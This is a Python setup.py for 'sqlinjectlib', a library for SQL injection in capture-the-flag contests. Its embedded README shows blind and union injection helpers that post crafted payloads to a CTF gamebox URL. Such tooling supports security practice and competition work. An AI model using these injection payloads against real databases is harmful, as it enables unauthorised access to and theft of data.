# -*- coding: utf-8 -*-
from setuptools import setup

packages = \
['sqlinjectlib']

package_data = \
{'': ['*']}

install_requires = \
['typing-extensions>=4.4.0,<5.0.0']

setup_kwargs = {
    'name': 'sqlinjectlib',
    'version': '0.1.1',
    'description': 'A library to simplify SQL injections during CTFs',
    'long_description': '# SQLInjectLib\n\n## Introduction\n\n> A library to simplify SQL injections during CTFs\n\n## Code samples\n\n> Extracted from a CTF, some parts were omitted\n>\n> ### Blind Injection\n>\n> ```python\n> def blind_injection(q: SQL[bool]) -> bool:\n>    query = f"animals1\' and ({q})--"\n>    final_query = replace_all(query)\n>    c = post(\n>        "http://gamebox1.reply.it/dc5ff0efae41b3500b9ebc0ee9ee5a78c98f41a9/",\n>        data={"query": final_query},\n>    )\n>    return "ANIMALS1" in c.text\n> ```\n>\n> ### Union Injection\n>\n> ```python\n> def union_injection(q: SQL[str]) -> str | None:\n>   query = f"hdjhfjdf\' union select \'aa\',\'aa;aa\',{q},1--"\n>   final_query = replace_all(query)\n>   c = post(\n>       "http://gamebox1.reply.it/dc5ff0efae41b3500b9ebc0ee9ee5a78c98f41a9/",\n>       data={"query": final_query},\n>   )\n>   m = TAG_FINDER.search(c.text)\n>   result = m.group(1)\n>   return result\n> ```\n\n## Installation\n\n> Install locally with:\n>\n> ```bash\n> python3 -m pip install sqlinjectlib\n> ```\n',
    'author': 'rikyiso01',
    'author_email': 'riky.isola@gmail.com',
    'maintainer': 'None',
    'maintainer_email': 'None',
    'url': 'https://github.com/rikyiso01/sqlinjectlib',
    'packages': packages,
    'package_data': package_data,
    'install_requires': install_requires,
    'python_requires': '>=3.10,<4.0',
}


setup(**setup_kwargs)
